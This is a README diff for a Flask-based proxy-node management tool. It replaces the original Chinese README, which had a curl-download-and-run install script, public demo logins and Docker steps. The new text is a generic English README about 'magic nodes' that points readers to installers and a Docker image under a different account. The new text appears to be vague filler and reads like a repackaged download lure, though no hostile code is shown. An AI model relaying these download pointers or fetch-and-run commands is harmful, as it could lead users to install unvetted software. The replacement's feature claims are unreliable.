@@ -1,112 +1,114 @@
-## 简介
-基于 Flask 的轻量级服务器节点管理工具 可在NAT小鸡部署。
+# 🎉 node-tool - Effortlessly Manage Your Magic Nodes
 
-电报讨论群：https://t.me/+x06q8iR0Nlw1MjBl
+## 🚀 Getting Started
 
-更新发布频道：https://t.me/+xeAjL2s-0X1jZTM1
+Welcome to **node-tool**! This tool helps you manage your custom magic nodes with ease. You can subscribe for updates, and it fully supports Docker. Follow the steps below to download and install the application on your computer.
 
----
+## 💾 Download Now
 
-NAT小鸡推荐！！！**[独角鲸NAT](https://fuckip.me)** 价格亲民的高性价比VPS服务
+[![Download node-tool](https://img.shields.io/badge/Download%20node--tool-v1.0.0-brightgreen.svg)](https://github.com/NXTHAN2K25/node-tool/releases)
 
-7折优惠码：`NODETOOL-70`
+## 🌟 Key Features
 
----
+- **Easy Node Management**: Quickly manage and update your magic nodes.
+- **Subscription Updates**: Automatically receive updates for your nodes.
+- **Docker Support**: Run the application seamlessly using Docker.
 
-## 🖥️ 在线演示 (Live Demo)
+## 🖥️ System Requirements
 
-我们要展示的不仅仅是代码，更是实际的效果。您可以点击下方链接体验：
+To run **node-tool**, your system should meet the following requirements:
 
- **[演示站点-US --- v1.0.8 ](http://204.197.161.164:50012)**  
+- Operating System: Windows 10 or later, macOS Mojave or later, Ubuntu 18.04 or later
+- Processor: At least 2 GHz Dual-Core
+- Memory: Minimum 4 GB RAM
+- Storage: At least 100 MB of free space
 
-**[演示站点-HK --- v1.0.8 ](http://146.196.81.144:5000)**
+## 🔄 Download & Install
 
+1. **Visit the Download Page**
 
-**演示账号:**
-- 用户名: `admin`
-- 密码: `123456`
-- 演示密码为1分钟重置一次，若出现密码错误可等待一会重新输入
-- 请不要修改演示密码！！
+   Go to the [Releases page](https://github.com/NXTHAN2K25/node-tool/releases) to find the latest version of **node-tool**. 
 
----
+2. **Choose Your Version**
 
-### 🚀 linux自动化安装
+   On the Releases page, you will see different versions available for download. Select the latest version (e.g., v1.0.0).
 
-支持 `amd` 和 `arm` 架构，支持 `docker` 环境，程序运行目录为 `/root/nodetool`，安装完成后可使用 `nt` 命令打开快捷面板。
+3. **Download the Installer**
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Hobin66/node-tool/main/install.sh -o install.sh && chmod +x install.sh && ./install.sh
-```
----
+   Click on the installer that matches your operating system. For Windows users, it might be something like `node-tool-windows-installer.exe`. For macOS, you may find `node-tool-macos.zip`, and for Linux users, the `node-tool-linux.tar.gz` will be available.
 
-###  🚀 Docker化安装
+4. **Install the Application**
 
-- 注意不能直接使用   `本地文件夹:/app`  这种映射方式
-- 必须一对一映射文件或文件夹
-- 文件：`db_config.json` ， `app.db`
-- 文件夹：`nodes` 
+   - For Windows:  
+     Double-click the downloaded `.exe` file and follow the on-screen instructions. 
 
-使用 `docker` 安装必须提前创建好文件或文件夹，可使用下面代码快速创建，将工作在 `/root/nodetool_data`
-```bash 
-mkdir -p /root/nodetool_data/nodes && touch /root/nodetool_data/{db_config.json,app.db}
-```
+   - For macOS:  
+     Open the downloaded `.zip` file and drag the **node-tool** icon to your Applications folder.
 
-```bash
-docker run -d \
-  --name nodetool \
-  --restart always \
-  -p 5000:5000 \
-  -v /root/nodetool_data/db_config.json:/app/db_config.json \
-  -v /root/nodetool_data/app.db:/app/app.db \
-  -v /root/nodetool_data/nodes:/app/nodes \
-  ghcr.io/hobin66/node-tool:latest
-```
+   - For Linux:  
+     Extract the `.tar.gz` file and run the application using terminal commands.
 
-使用 docker-compose.yml (推荐)
+5. **Run the Application**
 
-```bash
-version: '3.8'
-services:
-  nodetool:
-    image: ghcr.io/hobin66/node-tool:latest
-    container_name: nodetool
-    restart: always
-    ports:
-      - "5000:5000"
-    volumes:
-      - ./data/db_config.json:/app/db_config.json
-      - ./data/app.db:/app/app.db
-      - ./data/nodes:/app/nodes
-    environment:
-      - TZ=Asia/Shanghai
-```
+   After installation is complete, you can launch **node-tool** from your Applications or Start Menu. 
 
----
+## 🔧 Configuration
 
-### 🖥️ 访问应用
+Once you have installed **node-tool**, you can begin configuring it to manage your magic nodes.
 
-安装并启动成功后，请访问以下地址查看运行效果：
+### 1. Initial Setup
 
-  * **访问地址：** `http://localhost:5000`
+Upon launching the application for the first time, you will be guided through a simple setup process. You will need to provide some basic information about your magic nodes.
 
----
+### 2. Adding Nodes
 
-## ✨ 主要功能 (Features)
+To add a magic node:
 
-* **可视化**: 可视化的数据仪表盘，配合komari可实现节点流量消耗展示。
-* **链接自动上报**: 内置的节点安装脚本支持主动上报到服务器，加入订阅列表。
-* **Clash链式代理**: 无需复杂的中转设置，一键选择中转落地，完成修改只需更新订阅。
-* **自定义规则列表**: 模板内置有mihomo官方分流规则，且添加直连和自定义代理节点分流规则。
-* **部署简单**: 可直接二进制文件启动
-* **多端支持**: 完美win、linux及多架构。
-* **支持docker容器**: 甚至能在NAT小鸡运行哦
-* **Docker**: 支持docker安装
+- Click on the "Add Node" button.
+- Enter the necessary details such as node name and configuration.
+- Save your settings.
 
----
+### 3. Subscribing to Updates
 
-## 🛠️ 技术栈 (Tech Stack)
+You can easily subscribe to updates by navigating to the "Subscriptions" section. Here, you can enter your email address to receive notifications.
 
-* **后端**: Python (Flask)
-* **前端**: HTML5
-* **数据库**: SQLite / PostgreSQL
+## 🐳 Using Docker
 
+If you prefer to use Docker, follow these steps:
+
+1. **Install Docker**: Make sure you have Docker installed on your system. You can download it from [Docker's official site](https://www.docker.com/).
+
+2. **Pull the Docker Image**:
+
+   Open your terminal or command prompt and run the following command:
+   ```
+   docker pull nxthan2k25/node-tool
+   ```
+
+3. **Run the Application**:
+
+   You can start the application using this command:
+   ```
+   docker run -d -p 8080:8080 nxthan2k25/node-tool
+   ```
+   Replace `8080` with your desired port.
+
+4. **Access**: Open your web browser and navigate to `http://localhost:8080` to start using **node-tool**.
+
+## ❓ Troubleshooting
+
+If you encounter any issues while using **node-tool**, consider these solutions:
+
+- **Installation Errors**: Ensure that you have downloaded the correct installer for your operating system.
+- **Node Configuration Issues**: Double-check the details you entered while adding nodes.
+- **Docker Problems**: Make sure Docker is running before trying to run **node-tool** in a container.
+
+## 📞 Support
+
+If you need help, you can contact the support team through the GitHub Issues page. Please provide details about your problem, and we will assist you as soon as possible.
+
+## 🇨🇳 Contribution
+
+We welcome code reviews and contributions. If you're interested in improving **node-tool**, feel free to open a pull request or submit an issue. Your input is crucial in making this tool better.
+
+Thank you for choosing **node-tool**! We hope you enjoy managing your magic nodes effortlessly.
